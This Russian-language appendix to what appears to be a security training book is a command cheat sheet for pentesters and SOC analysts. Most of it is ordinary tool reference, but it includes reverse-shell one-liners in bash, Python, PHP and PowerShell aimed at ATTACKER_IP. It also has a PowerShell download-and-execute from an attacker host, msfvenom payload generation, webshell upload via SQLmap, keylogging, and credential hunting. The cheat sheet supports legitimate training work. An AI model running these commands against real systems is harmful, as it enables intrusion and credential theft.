# Приложение A: Быстрый справочник команд

Практическая шпаргалка для пентестера и SOC-аналитика. Используйте как быстрый справочник во время работы и подготовки к экзаменам.

---

## A.1 Linux команды для ИБ-специалиста

### Навигация и файловая система

```bash
# Навигация
pwd                          # Текущая директория
ls -la                       # Список файлов с правами
ls -lah /var/www             # Удобный вывод (h = human-readable)
find / -name "*.conf" 2>/dev/null  # Поиск файлов
find / -perm -4000 2>/dev/null     # Найти SUID файлы (privesc!)
find / -writable -type d 2>/dev/null  # Записываемые директории
locate passwd                # Быстрый поиск (требует updatedb)

# Просмотр файлов
cat /etc/passwd              # Пользователи системы
cat /etc/shadow              # Хэши паролей (требует root)
head -n 20 file.txt          # Первые 20 строк
tail -n 20 file.txt          # Последние 20 строк
tail -f /var/log/syslog      # Мониторинг лога в реальном времени
grep -r "password" /var/www/ # Рекурсивный поиск
grep -i "password" file.txt  # Поиск без учёта регистра
grep -v "^#" config.txt      # Строки без комментариев
```

### Права доступа

```bash
# Просмотр прав
ls -la file.txt              # -rwxr-xr-- (user/group/others)
stat file.txt                # Подробная информация
getfacl file.txt             # ACL права

# Изменение прав
chmod 755 script.sh          # rwxr-xr-x
chmod u+x script.sh          # Добавить execute для владельца
chmod go-w file.txt          # Убрать write для group и others
chown user:group file.txt    # Изменить владельца

# Специальные биты (важно для privesc!)
chmod u+s /bin/bash          # SUID — выполнение от владельца
chmod g+s /tmp               # SGID
chmod +t /tmp                # Sticky bit

# Числовые значения:
# 4 = read (r)
# 2 = write (w)  
# 1 = execute (x)
# SUID = 4xxx, SGID = 2xxx, Sticky = 1xxx
# Пример: chmod 4755 = rwsr-xr-x (SUID)
```

### Процессы

```bash
# Просмотр процессов
ps aux                       # Все процессы
ps aux | grep nginx          # Найти конкретный процесс
ps -ef --forest              # Дерево процессов
top                          # Интерактивный мониторинг
htop                         # Улучшенный top
pstree                       # Дерево процессов

# Управление процессами
kill -9 PID                  # Принудительное завершение
pkill nginx                  # Завершить по имени
nohup cmd &                  # Запуск в фоне
bg / fg                      # Фоновые задачи

# Полезно при пентесте:
/proc/PID/cmdline            # Аргументы процесса
/proc/PID/environ            # Переменные окружения процесса
/proc/PID/maps               # Карта памяти процесса
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
```

### Сетевые команды Linux

```bash
# Информация о сети
ip addr                      # IP адреса интерфейсов
ip route                     # Таблица маршрутизации
ip neigh                     # ARP таблица
netstat -tulnp               # Открытые порты и процессы
ss -tulnp                    # Современная замена netstat
arp -a                       # ARP таблица

# Подключения и трафик
nc -lvnp 4444                # Netcat listener (реверс-шелл)
nc -nv TARGET_IP 80          # Подключиться к порту
curl -I http://target.com    # HTTP заголовки
wget http://target.com/file  # Скачать файл

# DNS
nslookup domain.com          # DNS запрос
dig domain.com               # Детальный DNS запрос
dig domain.com ANY           # Все записи
dig @8.8.8.8 domain.com      # Использовать конкретный DNS
host domain.com              # Быстрый DNS запрос
cat /etc/resolv.conf         # DNS сервера системы
cat /etc/hosts               # Локальный hosts файл

# Файервол (iptables)
iptables -L -n -v            # Правила фаервола
iptables -L INPUT -n --line-numbers  # С номерами строк
ufw status                   # UFW статус (Ubuntu)

# Передача файлов
scp file.txt user@host:/path/  # Копирование через SSH
rsync -avz file user@host:/    # Синхронизация
python3 -m http.server 8080    # Простой HTTP сервер
php -S 0.0.0.0:8080            # PHP HTTP сервер
```

### Полезные команды для Privilege Escalation

```bash
# Информация о системе
uname -a                     # Ядро и архитектура
cat /etc/os-release          # Версия ОС
id                           # Текущий пользователь и группы
whoami                       # Имя пользователя
sudo -l                      # Sudo права (без пароля возможно!)
cat /etc/sudoers             # Файл sudoers (если читаем)

# Пользователи и группы
cat /etc/passwd              # Список пользователей
cat /etc/group               # Группы
lastlog                      # Последние входы
last                         # История входов
w                            # Кто сейчас залогинен

# Cron задачи (potentional для privesc)
crontab -l                   # Cron текущего пользователя
cat /etc/crontab             # Системный cron
ls -la /etc/cron.*           # Директории cron
cat /var/log/cron            # Лог выполнения cron

# SUID/SGID (GTFOBins!)
find / -perm -u=s -type f 2>/dev/null  # SUID файлы
find / -perm -g=s -type f 2>/dev/null  # SGID файлы

# Capabilities (обход SUID ограничений)
getcap -r / 2>/dev/null      # Файлы с capabilities
# python3 cap_setuid = eip → python3 -c "import os;os.setuid(0);os.system('/bin/bash')"

# Записываемые пути в $PATH
echo $PATH
ls -la /usr/local/bin        # Проверить записываемость

# Переменные окружения
env                          # Все переменные
printenv                     # Альтернатива
```

---

## A.2 Windows команды для ИБ

### CMD основные команды

```cmd
:: Информация о системе
systeminfo                    :: Полная информация о системе
hostname                      :: Имя хоста
whoami                        :: Текущий пользователь
whoami /priv                  :: Привилегии пользователя
whoami /groups                :: Группы пользователя
net user                      :: Список локальных пользователей
net user username             :: Информация о пользователе
net localgroup administrators :: Члены группы администраторов
net group /domain             :: Группы домена (если в домене)

:: Сетевые команды
ipconfig /all                 :: Сетевые интерфейсы
ipconfig /displaydns          :: DNS кэш
netstat -ano                  :: Активные подключения
netstat -ano | findstr :80    :: Фильтр по порту
arp -a                        :: ARP таблица
route print                   :: Таблица маршрутизации
nslookup domain.com           :: DNS запрос
ping -n 1 192.168.1.1         :: Проверка доступности

:: Файловая система
dir /a                        :: Все файлы включая скрытые
dir /s /b *.txt               :: Рекурсивный поиск файлов
type file.txt                 :: Вывод файла (аналог cat)
findstr /si "password" *.txt  :: Поиск строки в файлах
icacls file.txt               :: Права на файл
attrib +h file.txt            :: Скрыть файл
attrib -h -s file.txt         :: Снять атрибуты скрытый/системный

:: Процессы
tasklist                      :: Список процессов
tasklist /svc                 :: Процессы и их службы
taskkill /pid PID /f          :: Завершить процесс
sc query                      :: Службы Windows
sc query type= all            :: Все службы

:: Реестр
reg query HKLM\Software\      :: Запрос реестра
reg query HKCU /f password /t REG_SZ /s  :: Поиск паролей
```

### PowerShell для ИБ

```powershell
# Информация о системе
Get-ComputerInfo
Get-WmiObject -Class Win32_OperatingSystem
[System.Environment]::OSVersion
$env:COMPUTERNAME
$env:USERNAME

# Пользователи и группы
Get-LocalUser                 # Локальные пользователи
Get-LocalGroup                # Локальные группы
Get-LocalGroupMember Administrators
Get-ADUser -Filter *          # AD пользователи (если RSAT)
Get-ADGroupMember "Domain Admins"  # Члены группы DA

# Сеть
Get-NetIPAddress              # IP адреса
Get-NetRoute                  # Таблица маршрутизации
Get-NetTCPConnection          # TCP подключения
Get-NetTCPConnection -State Listen  # Открытые порты
Test-NetConnection 8.8.8.8 -Port 443  # Проверка порта

# Процессы
Get-Process                   # Все процессы
Get-Process | Sort-Object CPU -Descending  # По CPU
Stop-Process -Name chrome -Force

# Файловая система
Get-ChildItem -Recurse -Force # Все файлы включая скрытые
Get-Content file.txt          # Аналог cat
Select-String -Path *.txt -Pattern "password"  # grep
Get-Item file.txt | Get-Acl  # Права на файл

# Службы
Get-Service                   # Все службы
Get-Service | Where-Object Status -eq Running

# Запланированные задачи (privesc!)
Get-ScheduledTask
Get-ScheduledTask | Where-Object TaskPath -like "\*"

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET  # Удалённая сессия
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}

# Загрузка и выполнение (пентест-техники)
# IEX (скачать и выполнить в памяти)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
# Или через Invoke-Expression
Invoke-Expression (Invoke-WebRequest http://ATTACKER/script.ps1).Content

# Обход ExecutionPolicy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass

# Полезные однострочники для пентеста
# Поиск паролей в реестре
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# AlwaysInstallElevated (privesc!)
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

### Командлеты Active Directory

```powershell
# Импорт модуля
Import-Module ActiveDirectory

# Пользователи и компьютеры
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties OperatingSystem
Get-ADGroup -Filter * | Select-Object Name

# Поиск пользователей с SPN (Kerberoasting!)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Пользователи с флагом "password never expires"
Get-ADUser -Filter {PasswordNeverExpires -eq $true}

# Найти DA
Get-ADGroupMember "Domain Admins" -Recursive

# Политики домена
Get-ADDefaultDomainPasswordPolicy
Get-GPO -All
```

---

## A.3 Nmap — основные флаги и примеры

### Типы сканирования

```bash
# БАЗОВЫЕ СКАНИРОВАНИЯ
nmap TARGET                   # Базовое сканирование (SYN на 1000 портов)
nmap -sV TARGET               # Определение версий сервисов
nmap -sC TARGET               # Запуск стандартных скриптов NSE
nmap -sC -sV TARGET           # Комбо: скрипты + версии (самое частое!)
nmap -A TARGET                # Агрессивный: ОС + версии + скрипты + traceroute
nmap -O TARGET                # Определение ОС
nmap -sV --version-intensity 9  # Максимальная интенсивность определения версий

# ТИПЫ СКАНИРОВАНИЯ ПОРТОВ
nmap -sS TARGET               # SYN scan (полускрытый, по умолчанию для root)
nmap -sT TARGET               # TCP Connect (для непривилегированного пользователя)
nmap -sU TARGET               # UDP scan (медленно!)
nmap -sU -sS TARGET           # Одновременно TCP и UDP
nmap -sN TARGET               # NULL scan
nmap -sF TARGET               # FIN scan
nmap -sX TARGET               # Xmas scan

# ДИАПАЗОНЫ ПОРТОВ
nmap -p 80 TARGET             # Один порт
nmap -p 80,443,8080 TARGET    # Несколько портов
nmap -p 1-1000 TARGET         # Диапазон
nmap -p- TARGET               # Все 65535 портов
nmap --top-ports 100 TARGET   # Топ 100 портов
nmap -p U:53,T:80 TARGET      # UDP 53 и TCP 80

# СКОРОСТЬ И ОБНАРУЖЕНИЕ ХОСТОВ
nmap -T0 TARGET               # Paranoid (медленно, скрытно)
nmap -T1 TARGET               # Sneaky
nmap -T2 TARGET               # Polite
nmap -T3 TARGET               # Normal (по умолчанию)
nmap -T4 TARGET               # Aggressive (быстро, рекомендован для CTF/лаб)
nmap -T5 TARGET               # Insane (очень быстро, много ложных результатов)

# ОБХОД ФАЕРВОЛА
nmap -Pn TARGET               # Не пинговать хост (если ICMP блокирован)
nmap -f TARGET                # Фрагментация пакетов
nmap --mtu 24 TARGET          # Кастомный MTU
nmap -D RND:10 TARGET         # Декои (случайные IP)
nmap -S SPOOF_IP TARGET       # Спуфинг источника
nmap --source-port 53 TARGET  # Исходящий порт 53 (обход фаервола)
nmap --data-length 200 TARGET # Добавить случайные данные

# ВЫВОД
nmap -oN output.txt TARGET    # Normal output
nmap -oX output.xml TARGET    # XML output
nmap -oG output.gnmap TARGET  # Greppable output
nmap -oA output TARGET        # Все форматы (output.nmap, .xml, .gnmap)
nmap -v TARGET                # Verbose
nmap -vv TARGET               # Очень verbose
```

### NSE скрипты (Nmap Scripting Engine)

```bash
# Поиск и использование скриптов
ls /usr/share/nmap/scripts/ | grep smb
nmap --script smb-vuln-ms17-010 TARGET       # EternalBlue
nmap --script "smb-*" TARGET                 # Все SMB скрипты
nmap --script vuln TARGET                    # Все уязвимости
nmap --script safe TARGET                    # Безопасные скрипты
nmap --script exploit TARGET                 # Эксплойты
nmap --script auth TARGET                    # Аутентификация

# Популярные скрипты
nmap --script http-enum TARGET               # Перечисление HTTP
nmap --script http-methods TARGET -p 80     # HTTP методы
nmap --script ssl-enum-ciphers -p 443 TARGET  # SSL шифры
nmap --script ftp-anon TARGET -p 21          # Anonymous FTP
nmap --script smb-enum-users TARGET          # SMB пользователи
nmap --script dns-brute TARGET               # Брутфорс DNS
nmap --script mysql-empty-password TARGET -p 3306  # MySQL без пароля

# Аргументы для скриптов
nmap --script http-brute --script-args userdb=users.txt,passdb=pass.txt TARGET -p 80
```

### Практические примеры OSCP-style

```bash
# Быстрое обнаружение хостов в подсети
nmap -sn 192.168.1.0/24

# Полное сканирование (типичный старт на OSCP)
nmap -sC -sV -oA initial_scan TARGET

# Поиск всех портов + детальный анализ
nmap -p- --min-rate 5000 -oA all_ports TARGET
# Затем детальный анализ открытых портов:
nmap -sC -sV -p 22,80,443,8080 -oA detail_scan TARGET

# AutoRecon (автоматизированная разведка)
autorecon TARGET              # Запускает все nmap + другие инструменты

# Masscan для скорости (потом nmap для деталей)
masscan -p1-65535 TARGET --rate=1000 -oG masscan.out
```

---

## A.4 Wireshark / tshark фильтры

### Основные фильтры отображения (Display Filters)

```bash
# Протоколы
http                          # HTTP трафик
https                         # HTTPS (только handshake, не содержимое)
dns                           # DNS запросы
ftp                           # FTP
ssh                           # SSH
tcp                           # Весь TCP
udp                           # Весь UDP
icmp                          # ICMP (пинги)
arp                           # ARP

# IP адреса
ip.addr == 192.168.1.1       # Любой трафик к/от IP
ip.src == 192.168.1.1        # Только исходящий от IP
ip.dst == 192.168.1.1        # Только входящий к IP
ip.addr == 192.168.1.0/24   # Вся подсеть

# Порты
tcp.port == 80                # Порт 80
tcp.dstport == 443            # Исходящий HTTPS
tcp.srcport == 80             # Ответы с 80 порта
udp.port == 53                # DNS

# Комбинации (операторы: and, or, not)
http and ip.src == 192.168.1.5
tcp.port == 80 or tcp.port == 443
not arp and not dns
http.request.method == "POST" and http.request.uri contains "login"

# HTTP фильтры
http.request                  # HTTP запросы
http.response                 # HTTP ответы
http.request.method == "POST"  # POST запросы
http.response.code == 200     # Успешные ответы
http.response.code == 401     # Unauthorized
http.contains "password"      # Содержит слово password
http.request.uri contains "/admin"  # Путь содержит /admin

# TCP флаги
tcp.flags.syn == 1            # SYN пакеты
tcp.flags.fin == 1            # FIN пакеты
tcp.flags.reset == 1          # RST пакеты
tcp.flags == 0x002            # Только SYN
tcp.flags == 0x018            # PSH + ACK (данные)

# Поиск credentials в трафике
http.request.method == "POST" and http contains "password"
ftp.request.command == "PASS"  # FTP пароли
```

### tshark (консольный Wireshark)

```bash
# Основные команды
tshark -r capture.pcap        # Читать PCAP файл
tshark -i eth0                # Захват с интерфейса
tshark -i eth0 -w output.pcap  # Сохранять захват

# Фильтры (используются в -Y "фильтр")
tshark -r file.pcap -Y "http.request.method == POST"
tshark -r file.pcap -Y "dns" -T fields -e dns.qry.name  # DNS запросы

# Полезные однострочники
# Все HTTP POST с данными
tshark -r file.pcap -Y "http.request.method == POST" -T fields \
  -e ip.src -e http.request.uri -e http.file_data

# Извлечь все DNS имена
tshark -r file.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort -u

# Найти учётные данные в FTP
tshark -r file.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" \
  -T fields -e ftp.request.command -e ftp.request.arg

# Статистика протоколов
tshark -r file.pcap -q -z io,phs

# Следовать TCP потоку
tshark -r file.pcap -q -z follow,tcp,ascii,0  # Поток 0

# Экспорт объектов HTTP (скачанные файлы)
tshark -r file.pcap --export-objects http,./exported_files/
```

---

## A.5 Burp Suite горячие клавиши и советы

### Горячие клавиши

```
BURP SUITE KEYBOARD SHORTCUTS:
================================

Навигация:
Ctrl+1              Proxy → Intercept
Ctrl+2              Proxy → HTTP history
Ctrl+3              Repeater
Ctrl+4              Intruder
Ctrl+5              Target → Site map
Ctrl+6              Scanner (Pro)

В редакторе запроса:
Ctrl+R              Отправить в Repeater
Ctrl+I              Отправить в Intruder
Ctrl+U              URL encode выбранного текста
Ctrl+Shift+U        URL decode
Ctrl+B              Base64 encode
Ctrl+Shift+B        Base64 decode
Ctrl+H              Найти и заменить
Ctrl+F              Поиск в запросе
Ctrl+Z              Отменить (в редакторе)

Общие:
F12                 Открыть/закрыть DevTools (встроенный браузер)
Ctrl+Shift+T        Новая вкладка в браузере
```

### Важные техники Burp Suite

```bash
# Proxy → Options
# Добавить правила замены (Match and Replace):
Match:   User-Agent: Mozilla.*
Replace: User-Agent: sqlmap/1.0

# Scope настройка (важно для BB!)
# Target → Scope → Include in scope
# Добавить только нужные домены!

# Intruder — типы атак:
# Sniper:     один payload list, одна позиция
# Battering ram: один payload list, все позиции одновременно
# Pitchfork:  несколько payload lists, параллельно
# Cluster bomb: несколько payload lists, перебор всех комбинаций

# Полезные расширения (BApp Store):
# - Autorize          (тестирование авторизации)
# - ActiveScan++      (расширенное сканирование)
# - Hackvertor        (кодирование/декодирование)
# - JWT Editor        (работа с JWT токенами)
# - Logger++          (расширенное логирование)
# - Param Miner       (поиск скрытых параметров)
# - Turbo Intruder    (быстрый Intruder)
# - SQLiPy            (SQLMap интеграция)

# Decoder — быстрое кодирование/декодирование:
# Ctrl+D → Decoder
# Поддерживает: URL, HTML, Base64, Hex, ASCII, SHA, MD5
```

---

## A.6 SQLmap шпаргалка

```bash
# БАЗОВЫЕ КОМАНДЫ
sqlmap -u "http://target.com/page?id=1"  # Базовое тестирование
sqlmap -u "http://target.com/page?id=1" --dbs  # Получить базы данных
sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # Таблицы
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns  # Столбцы
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump  # Данные

# ТЕХНИЧЕСКИЕ ПАРАМЕТРЫ
--dbms=mysql              # Указать СУБД (mysql, mssql, oracle, postgres)
--level=3                 # Уровень тестирования 1-5 (по умолчанию 1)
--risk=2                  # Риск 1-3 (по умолчанию 1, осторожно с 3!)
--technique=BEUST         # Техники: B=boolean, E=error, U=union, S=stacked, T=time
--threads=5               # Параллельные потоки

# POST ЗАПРОСЫ
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
sqlmap -u "http://target.com/login" --data="user=*&pass=test"  # * = точка инъекции

# С ПЕРЕХВАЧЕННЫМ ЗАПРОСОМ BURP
sqlmap -r request.txt     # Файл с raw HTTP запросом из Burp

# COOKIE ИНЪЕКЦИЯ
sqlmap -u "http://target.com/" --cookie="id=1" -p id

# ЗАГОЛОВКИ
sqlmap -u "http://target.com/" --header="X-Forwarded-For: 1*"
sqlmap -u "http://target.com/" -H "Authorization: Bearer TOKEN"

# АУТЕНТИФИКАЦИЯ
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxxxx"
sqlmap -u "http://target.com/page?id=1" -p id --auth-type=Basic --auth-cred="admin:password"

# ОБХОД ФАЕРВОЛА/WAF
sqlmap -u "http://target.com/?id=1" --random-agent    # Случайный User-Agent
sqlmap -u "http://target.com/?id=1" --tamper=space2comment  # Тампер скрипты
sqlmap -u "http://target.com/?id=1" --tamper=between,space2comment,randomcase
sqlmap -u "http://target.com/?id=1" --delay=2         # Задержка между запросами
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"  # Через Burp

# СПИСОК ТАМПЕРОВ:
# apostrophemask, base64encode, between, charencode
# charunicodeescape, greatest, htmlencode
# modsecurityversioned, multiplespaces
# randomcase, space2comment, space2hash
# unmagicquotes

# ВЫПОЛНЕНИЕ КОМАНД (если позволяет СУБД)
sqlmap -u "http://target.com/?id=1" --os-shell   # Интерактивный shell (MSSQL, MySQL)
sqlmap -u "http://target.com/?id=1" --sql-shell  # SQL shell
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"  # Выполнить команду

# ФАЙЛЫ
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"   # Читать файл
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# ПОЛЕЗНЫЕ ФЛАГИ
--batch                   # Не задавать вопросов (автоответ)
--dump-all                # Дамп всех баз
--output-dir=/tmp/sqlmap  # Директория для результатов
-v 3                      # Verbose (0-6)
--flush-session           # Сбросить кэш
--forms                   # Автоматически тестировать формы
--crawl=2                 # Кроулить сайт и тестировать формы
```

---

## A.7 Metasploit основные команды

```bash
# ЗАПУСК И НАВИГАЦИЯ
msfconsole                    # Запустить Metasploit
msfconsole -q                 # Тихий режим (без баннера)
msf6 > help                   # Помощь
msf6 > version                # Версия
msf6 > exit                   # Выход

# ПОИСК МОДУЛЕЙ
search ms17-010               # Поиск по CVE/имени
search type:exploit platform:windows  # Поиск по фильтрам
search eternalblue            # Поиск по ключевому слову

# ИСПОЛЬЗОВАНИЕ МОДУЛЯ
use exploit/windows/smb/ms17_010_eternalblue  # Загрузить модуль
info                          # Информация о модуле
show options                  # Показать параметры
show payloads                 # Доступные payload'ы
show targets                  # Доступные цели

# НАСТРОЙКА ПАРАМЕТРОВ
set RHOSTS 192.168.1.100      # Цель (хост)
set RPORT 445                 # Целевой порт
set LHOST 192.168.1.50        # Слушающий хост (ваш IP)
set LPORT 4444                # Слушающий порт
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Payload
setg LHOST 192.168.1.50       # Глобальная установка

# ЗАПУСК
run                           # Запустить эксплойт
exploit                       # Альтернатива run
check                         # Проверить уязвимость (без эксплуатации)
run -j                        # Запустить как фоновое задание

# СЕССИИ
sessions                      # Список сессий
sessions -i 1                 # Взаимодействовать с сессией 1
sessions -k 1                 # Завершить сессию 1
background                    # Перевести сессию в фон (Ctrl+Z)
jobs                          # Активные задачи

# METERPRETER КОМАНДЫ
sysinfo                       # Информация о системе
getuid                        # Текущий пользователь
getpid                        # PID процесса Meterpreter
shell                         # Получить системный shell
exit                          # Выйти из shell обратно в meterpreter

# Повышение привилегий
getsystem                     # Попытка получить SYSTEM
hashdump                      # Дамп хэшей (нужен SYSTEM)

# Файловая система
ls                            # Список файлов
pwd                           # Текущая директория
cd C:\\Windows                # Смена директории
cat C:\\Users\\user\\Desktop\\flag.txt  # Читать файл
upload /local/file C:\\remote\\file     # Загрузить файл
download C:\\remote\\file /local/path   # Скачать файл
search -f *.txt -d C:\\Users  # Поиск файлов

# Сеть
ipconfig                      # Сетевые интерфейсы
arp                           # ARP таблица
route                         # Таблица маршрутизации
portfwd add -l 3389 -p 3389 -r 192.168.1.100  # Port forwarding

# Скриншоты и keylogging
screenshot                    # Скриншот рабочего стола
keyscan_start                 # Начать keylogging
keyscan_dump                  # Дамп клавиш
keyscan_stop                  # Остановить keylogging

# Pivoting
run autoroute -s 192.168.2.0/24  # Добавить маршрут через жертву
use auxiliary/server/socks_proxy  # SOCKS прокси

# ВСПОМОГАТЕЛЬНЫЕ МОДУЛИ (auxiliary)
use auxiliary/scanner/smb/smb_ms17_010   # Сканер EternalBlue
use auxiliary/scanner/ssh/ssh_login      # Брутфорс SSH
use auxiliary/scanner/http/http_login    # Брутфорс HTTP
use auxiliary/scanner/portscan/tcp       # TCP сканер
use auxiliary/scanner/smb/smb_enumusers # Перечисление SMB пользователей

# ГЕНЕРАЦИЯ PAYLOAD'ОВ (msfvenom)
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# PowerShell encoded payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd

# Listener handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

---

## A.8 Git для ведения портфолио

```bash
# НАСТРОЙКА
git config --global user.name "Ваше Имя"
git config --global user.email "email@example.com"
git config --global init.defaultBranch main

# СОЗДАНИЕ И ИНИЦИАЛИЗАЦИЯ
git init                      # Инициализировать репозиторий
git clone URL                 # Клонировать репозиторий
git clone URL dirname         # Клонировать в конкретную папку

# РАБОТА С ФАЙЛАМИ
git status                    # Статус рабочей директории
git add file.md               # Добавить файл в staging
git add .                     # Добавить все изменения
git add -p                    # Интерактивное добавление
git rm file.md                # Удалить файл
git mv old.md new.md          # Переименовать файл

# КОММИТЫ
git commit -m "Add HTB Lame write-up"  # Коммит с сообщением
git commit -am "Update write-up"       # Add + Commit (только tracked)
git log                        # История коммитов
git log --oneline              # Короткий вывод
git log --graph --oneline      # Граф веток
git diff                       # Несохранённые изменения
git diff --staged              # Staged изменения

# ВЕТКИ
git branch                    # Список веток
git branch feature-writeup    # Создать ветку
git checkout feature-writeup  # Переключиться на ветку
git checkout -b new-branch    # Создать и переключиться
git merge feature-writeup     # Слить ветку в текущую
git branch -d feature-writeup # Удалить ветку

# REMOTE (GitHub)
git remote -v                 # Список remotes
git remote add origin URL     # Добавить remote
git push origin main          # Push в GitHub
git push -u origin main       # Push + установить upstream
git pull                      # Получить изменения
git fetch                     # Получить без слияния

# .gitignore для пентест-проекта
cat > .gitignore << 'EOF'
# Не коммитить!
*.pcap
*.pcapng
passwords.txt
hashes.txt
*.hash
loot/
private/
.env
notes-private.txt
EOF

# ПОЛЕЗНЫЕ АЛИАСЫ
git config --global alias.st status
git config --global alias.co checkout
git config --global alias.br branch
git config --global alias.lg "log --oneline --graph --all"

# ОРГАНИЗАЦИЯ КОММИТОВ ДЛЯ ПОРТФОЛИО
# Хорошие сообщения коммитов:
git commit -m "Add HTB Lame write-up - Samba RCE CVE-2007-2447"
git commit -m "Add DVWA SQLi pentest report"
git commit -m "Update Linux privesc cheatsheet - add capabilities"
git commit -m "Add custom subdomain enumeration script"

# Плохие сообщения:
git commit -m "update"       # ПЛОХО
git commit -m "fix"          # ПЛОХО  
git commit -m "asdf"         # ПЛОХО
```

---

## A.9 Быстрые однострочники (One-liners)

```bash
# REVERSE SHELLS (для легальных тестов!)
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# УЛУЧШЕНИЕ SHELL (TTY)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Затем: Ctrl+Z
stty raw -echo; fg
# Затем Enter дважды
export TERM=xterm

# ПЕРЕЧИСЛЕНИЕ
# Быстрое обнаружение хостов
for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i | grep "bytes from"; done

# Сканирование портов без nmap
for port in $(seq 1 1000); do (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "Port $port open"; done

# Поиск файлов с паролями
grep -rni "password\|passwd\|pwd\|secret\|api_key" /var/www/ 2>/dev/null

# Хэш-суммы
md5sum file.txt
sha256sum file.txt
echo -n "password" | md5sum  # Хэш строки

# Кодирование/Декодирование
echo -n "text" | base64            # Encode
echo "dGV4dA==" | base64 -d       # Decode
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
```

---

*Приложение B: Домашняя лаборатория*
